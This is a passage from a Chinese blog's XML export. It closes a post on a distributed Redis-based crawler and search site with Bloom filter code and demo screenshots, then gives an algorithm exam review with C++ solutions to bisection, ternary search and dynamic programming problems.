class="line"></span><br><span class="line">pool = redis.ConnectionPool(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>, password=<span class="string">'yuan123'</span>)</span><br><span class="line">conn = redis.StrictRedis(connection_pool=pool)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    bf = PyBloomFilter(conn=conn)</span><br><span class="line">    bf.add(<span class="string">'www.baidu.com'</span>)</span><br><span class="line">    bf.add(<span class="string">'www.google.com'</span>)</span><br><span class="line">    print(bf.is_exist(<span class="string">'www.zhihu.com'</span>))</span><br><span class="line">    print(bf.is_exist(<span class="string">'www.baidu.com'</span>))</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(end - start)</span><br></pre></td></tr></table></figure>
<p>上述测试代码运行结果如下，结果中0代表未重复，1代表已重复，从时间来看效率还是比较高的：</p>
<p><img src="/2020/06/22/ISASearch/90e4135ddb0fc18397455d3df825a32b.png" alt></p>
<h1 id="4系统展示"><a href="#4系统展示" class="headerlink" title="4系统展示"></a>4系统展示</h1><h2 id="4-1-分布式爬取"><a href="#4-1-分布式爬取" class="headerlink" title="4.1 分布式爬取"></a>4.1 分布式爬取</h2><p>本项目的分布式演示用到了本机（Windows 10）同时作为master和slave，另有一台Vmware虚拟机（Ubuntu）作为slave。</p>
<p>首先分别在两个系统上运行main.py文件，使爬虫运行，但是由于此使Redis中并没有创建start_urls，所以两个系统下的slave爬虫均处于等待状态：</p>
<p>（1）Windows 10：</p>
<p><img src="/2020/06/22/ISASearch/3ab23ab1d79ade10070b2511c1d141c3.png" alt></p>
<p>（2）Ubuntu：</p>
<p><img src="/2020/06/22/ISASearch/c92ed258cae76c7804dc51df5c2a5812.png" alt></p>
<p>要启动爬虫，首先需要建立一个Redis客户端并连接对应的Redis服务端，然后使用如下命令加入将带爬取的首页url加入start_urls中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lpush xianzhi:start_urls https://xz.aliyun.com/</span><br></pre></td></tr></table></figure>
<p>Redis命令如下：</p>
<p><img src="/2020/06/22/ISASearch/cb9c64d842438958365e01ffcf9a705f.png" alt></p>
<p>执行完上述命令后，可以看到slaves上的爬虫开始进行分布式爬取：</p>
<p>（1）Windows 10</p>
<p><img src="/2020/06/22/ISASearch/ac8a452651ed348a5e7cbb37840ce3a6.png" alt></p>
<p>（2）Ubuntu</p>
<p><img src="/2020/06/22/ISASearch/98cf9fb5157dc177ae319df7fc970e3a.png" alt></p>
<h2 id="4-2-搜索网站首页"><a href="#4-2-搜索网站首页" class="headerlink" title="4.2 搜索网站首页"></a>4.2 搜索网站首页</h2><p>搜索网站的首页效果图展示如下，可以看到搜索框下面具有“热门搜索”和“我的搜索”列表，只需要在搜索框中输入关键词，然后点击搜素按钮即可进行搜索：</p>
<p><img src="/2020/06/22/ISASearch/5d6fc3aabd1a2b88c733e1997b49c6d7.png" alt></p>
<h2 id="4-3-搜索提示展示"><a href="#4-3-搜索提示展示" class="headerlink" title="4.3 搜索提示展示"></a>4.3 搜索提示展示</h2><p>用户进行搜索，假设搜索框中输入关键词“python”，系统可根据该关键词进行搜索提示，效果展示如下：</p>
<p><img src="/2020/06/22/ISASearch/075702abaae5bc06f13a0a16834a1c30.png" alt></p>
<h2 id="4-4-搜索结果展示"><a href="#4-4-搜索结果展示" class="headerlink" title="4.4 搜索结果展示"></a>4.4 搜索结果展示</h2><p>点击搜索后，会跳转到搜索结果页面，页面左侧即位爬虫统计数据，页面中间为搜索到的文章信息（包括题目、作者、标签、评分、来源、发布时间、阅读量），页面右侧即为实时更新的“热门搜索”和“我的搜索”列表：</p>
<p><img src="/2020/06/22/ISASearch/dc6ec754f83a2f0ba1d1d7efb2a5a45f.png" alt></p>
<p>在搜索结果中还可以看到根据关键词所搜索道德结果数量、搜索用时以及页数：</p>
<p><img src="/2020/06/22/ISASearch/a34f2eb77d4991d3f9d8feefdd8f91e0.png" alt></p>
<p>分页跳转则在页面的最底部：</p>
<p><img src="/2020/06/22/ISASearch/afb8bb0b2e1d9bc862e899a8881f7d53.png" alt></p>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>算法实验考试复习</title>
    <url>/2019/10/28/algorithm-experiment-review/</url>
    <content><![CDATA[<h1 id="递归与分支"><a href="#递归与分支" class="headerlink" title="递归与分支"></a>递归与分支</h1><p><br></p>
<h3 id="内部收益率"><a href="#内部收益率" class="headerlink" title="内部收益率"></a>内部收益率</h3><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p><img src="/2019/10/28/algorithm-experiment-review/20191021155812690.png" alt="在这里插入图片描述"></p>
<h5 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h5><p><img src="/2019/10/28/algorithm-experiment-review/20191021155824338.png" alt="在这里插入图片描述"></p>
<h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><p>对于每组数据，输出仅一行，即项目的IRR，四舍五入保留小数点后两位。</p>
<h5 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">-1</span> <span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">-8</span> <span class="number">6</span> <span class="number">9</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">1<span class="selector-class">.00</span></span><br><span class="line">0<span class="selector-class">.50</span></span><br></pre></td></tr></table></figure>
<h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n, f, CF[<span class="number">12</span>];</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; f;</span><br><span class="line">		<span class="keyword">double</span> mid, high = <span class="number">10000</span>, low = <span class="number">-1</span>, r, k, sum;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">			<span class="built_in">cin</span> &gt;&gt; CF[i];</span><br><span class="line">		<span class="keyword">while</span> (high - low &gt; <span class="number">1.0e-6</span>)    </span><br><span class="line">		&#123;</span><br><span class="line">			mid = (high + low) / <span class="number">2</span>; </span><br><span class="line">			k = <span class="number">1</span>;</span><br><span class="line">			sum = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				k *= (<span class="number">1.0</span> / (<span class="number">1</span> + mid)); </span><br><span class="line">				sum += CF[j] * k;  </span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (sum + f &gt; <span class="number">0</span>)</span><br><span class="line">				low = mid;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				high = mid;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; fixed &lt;&lt; setprecision(<span class="number">2</span>) &lt;&lt; mid &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-J-奶牛的聚会"><a href="#问题-J-奶牛的聚会" class="headerlink" title="问题 J: 奶牛的聚会"></a>问题 J: 奶牛的聚会</h3><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>农历新年马上就要到了，奶牛们计划举办一次聚会庆祝新年的到来。但是，奶牛们并不喜欢走太远的路，这会给他们的聚会带来消极情绪，当一头奶牛的消极指数为Wi，他参加聚会所需行走的距离为si，那么他就会给聚会带来Si3*Wi的消极情绪。所有奶牛所在位置都在一条直线上，已知所有奶牛的坐标和消极指数，求如何确定聚会地点，使得所有奶牛给聚会带来的消极情绪之和最小，输出消极情绪之和的最小值。</p>
<h5 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h5><p>第一行包含一个整数 Ca(Ca&lt;=20) ，表示有 Ca 组测试数据。</p>
<p>对于每组测试数据：第一行包含一个整数n(1&lt;=n&lt;=50000) ，表示奶牛的数量。接下来 n 行每行包含两个浮点数Si和wi (-106&lt;=Si&lt;=106, 0&lt;Wi&lt;15)。</p>
<h5 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h5><p>对于每组测试数据，输出 “Case #c: ans” ，其中c表示测试数据编号，ans表示消极情绪之和的最小值，结果四舍五入为一个整数。</p>
<h5 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">0.9</span> <span class="number">2</span></span><br><span class="line"><span class="number">1.4</span> <span class="number">4</span></span><br><span class="line"><span class="number">3.1</span> <span class="number">1</span></span><br><span class="line"><span class="number">6.2</span> <span class="number">1</span></span><br><span class="line"><span class="number">8.3</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Case</span> <span class="meta">#1: 300</span></span><br></pre></td></tr></table></figure>
<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>三分查找法确定消极情绪之和最小的位置，结合注释应该不难理解。</p>
<h5 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">50010</span>;</span><br><span class="line"><span class="keyword">double</span> Si[maxn], wi[maxn];</span><br><span class="line"><span class="keyword">int</span> n, Ca;</span><br><span class="line"><span class="comment">//计算聚会位置在pos时的消极情绪之和</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">ans</span><span class="params">(<span class="keyword">double</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//计算每个奶牛距离聚会位置的距离(非负)</span></span><br><span class="line">        <span class="keyword">double</span> dist = Si[i] - pos;</span><br><span class="line">        <span class="keyword">if</span> (dist &lt; <span class="number">0</span>)</span><br><span class="line">            dist = -dist;</span><br><span class="line">        sum += <span class="built_in">pow</span>(dist, <span class="number">3</span>) * wi[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; Ca;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= Ca; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; Si[j] &gt;&gt; wi[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//找到坐标位置最小的奶牛</span></span><br><span class="line">        <span class="keyword">double</span> low = Si[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">            <span class="keyword">if</span> (Si[k] &lt; low)</span><br><span class="line">                low = Si[k];</span><br><span class="line">        <span class="comment">//找到坐标位置最小的奶牛</span></span><br><span class="line">        <span class="keyword">double</span> high = Si[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; n; l++)</span><br><span class="line">            <span class="keyword">if</span> (Si[l] &gt; high)</span><br><span class="line">                high = Si[l];</span><br><span class="line">        <span class="comment">//三分查找法确定最终位置</span></span><br><span class="line">        <span class="keyword">while</span> (high - low &gt; <span class="number">1e-7</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">double</span> m1 = (high + low) / <span class="number">2.0</span>;</span><br><span class="line">            <span class="keyword">double</span> m2 = (m1 + high) / <span class="number">2.0</span>;</span><br><span class="line">            <span class="keyword">if</span> (ans(m1) &gt; ans(m2))</span><br><span class="line">                low = m1;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                high = m2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case #"</span> &lt;&lt; i &lt;&lt; <span class="string">": "</span> &lt;&lt; ll(ans(low) + <span class="number">0.5</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-E-光合作用"><a href="#问题-E-光合作用" class="headerlink" title="问题 E: 光合作用"></a>问题 E: 光合作用</h3><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>蒜头是个爱学习的孩子，他总喜欢在生活中做一些小实验，这次蒜头想研究一下光合作用。蒜头的实验材料有如下几样：神奇的种子，普通的纸箱和一些光源。一开始，蒜头将种子均匀的种在了箱子底部，你可以将其看成 X 轴，种子的位置为 X 轴上的点。然后蒜头用纸板将箱子盖住，并在纸板上安装了一些光源（具体见图，顶上的为光源，光源两边与顶部的夹角都为45度，黄色部分为光照，绿色的为植物。）。神奇的种子会在有光的情况下一直向上生长直到没光为止。现在蒜头想知道当实验结束时每颗种子的高度是多少？</p>
<h5 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h5><p>第一行输入一个整数 T，表示测试数据的组数。</p>
<p>每组数据的第一行是三个整数 n,m,h(1&lt;=n,m&lt;=1e5,0&lt;=m&lt;=1e5,1&lt;=h&lt;=1e4),n表示种子数(编号为1,2…n)，m表示光源数,h 表示箱子的高度。</p>
<p>接下来m行，每行一个整数Xi表示第i个光源在顶部的位置。</p>
<h5 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h5><p>对于每组测试数据，请输出n行，每行一个数表示第i颗种子的最终高度。</p>
<h5 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line"><span class="symbol">7 </span><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">4</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h5><p>二分法</p>
<h5 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e5</span> + <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> x[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> T;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">	<span class="keyword">while</span> (T--)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> n, m, h;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m &gt;&gt; h;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cin</span> &gt;&gt; x[i];</span><br><span class="line">		&#125;</span><br><span class="line">		sort(x + <span class="number">1</span>, x + m + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">int</span> cnt = lower_bound(x + <span class="number">1</span>, x + m + <span class="number">1</span>, i) - x;</span><br><span class="line">			<span class="keyword">if</span> (cnt == <span class="number">1</span> &amp;&amp; m != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				ans = max(ans, h - x[cnt] + i);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (cnt == m + <span class="number">1</span> &amp;&amp; m != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				ans = max(ans, h - i + x[cnt - <span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (m != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				ans = max(<span class="number">0</span>, max(h - i + x[cnt - <span class="number">1</span>], h - x[cnt] + i));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><p><br></p>
<h3 id="跳台阶"><a href="#跳台阶" class="headerlink" title="跳台阶"></a>跳台阶</h3><h5 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h5><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。</p>
<h5 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h5><p>多组测试样例。每组测试样例包含一个整数n。(1&lt;=n&lt;=100)</p>
<h5 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h5><p>每组测试样例输出一行，表示青蛙跳上n级台阶的跳法数量.</p>
<p>所得到的结果模1000000007</p>
<h5 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h5><p>可以有多种方法，我这里选用动态规划。</p>
<p>dp[i]表示i阶台阶的跳法有多少种，一次只能跳一阶或两阶。</p>
<p>已知dp[1]=1,dp[2]=2，所以dp[i]=dp[i-1]+dp[i-2]，表示：<br>到达i阶 = （最后一步跳一阶到达i）+ (最后一步跳两阶到达i) </p>
<h5 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">105</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">climb</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">	dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		dp[i] = (dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>]) % <span class="number">1000000007</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; climb(n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h3><h5 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h5><p>给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。<br>例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。<br>现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？</p>
<h5 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h5><p>输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。</p>
<h5 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h5><p>对于每组输入，输出两个字符串的最长公共子序列的长度。</p>
<h5 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">abcfbc abfcab</span></span><br><span class="line"><span class="attribute">programming contest</span> </span><br><span class="line"><span class="attribute">abcd mnp</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h5><p><img src="/2019/10/28/algorithm-experiment-review/20191024213255532.png" alt="在这里插入图片描述"><br><img src="/2019/10/28/algorithm-experiment-review/2019102421330565.png" alt="在这里插入图片描述"></p>
<h5 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN = <span class="number">105</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> x[MAXN], y[MAXN];</span><br><span class="line">	<span class="keyword">int</span> c[MAXN][MAXN] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; x &gt;&gt; y)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> m = <span class="built_in">strlen</span>(x);</span><br><span class="line">		<span class="keyword">int</span> n = <span class="built_in">strlen</span>(y);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (x[i<span class="number">-1</span>] == y[j<span class="number">-1</span>])</span><br><span class="line">				&#123;</span><br><span class="line">					c[i][j] = c[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (c[i - <span class="number">1</span>][j] &gt; c[i][j - <span class="number">1</span>])</span><br><span class="line">				&#123;</span><br><span class="line">					c[i][j] = c[i - <span class="number">1</span>][j];</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					c[i][j] = c[i][j - <span class="number">1</span>];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; c[m][n] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="矩阵连乘"><a href="#矩阵连乘" class="headerlink" title="矩阵连乘"></a>矩阵连乘</h3><h5 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h5><p>给定n个矩阵{A1,A2,…,An}，及m个矩阵连乘的表达式，判断每个矩阵连乘表达式是否满足矩阵乘法法则，如果满足，则计算矩阵的最小连乘次数，如果不满足输出“MengMengDa“。</p>
<h5 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h5><p>输入数据由多组数据组成（不超过10组样例）。每组数据格式如下：<br>第一行是2个整数n (1≤n≤26)和m(1≤m≤3)，表示矩阵的个数。<br>接下来n行，每行有一个大写字母，表示矩阵的名字，后面有两个整数r和c，分别表示该矩阵的行数和列数，其中1&lt;r, c&lt;100。<br>第n+1行到第n+m行，每行是一个矩阵连乘的表达式(2&lt;=矩阵个数&lt;=100)。</p>
<h5 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h5><p>对于每个矩阵连乘表达式，如果运算不满足矩阵乘法法则的情况（即左矩阵列数与右矩阵的行数不同），则输出“MengMengDa”，否则输出最小矩阵连乘次数。</p>
<p>数据保证结果不超过1e9。</p>
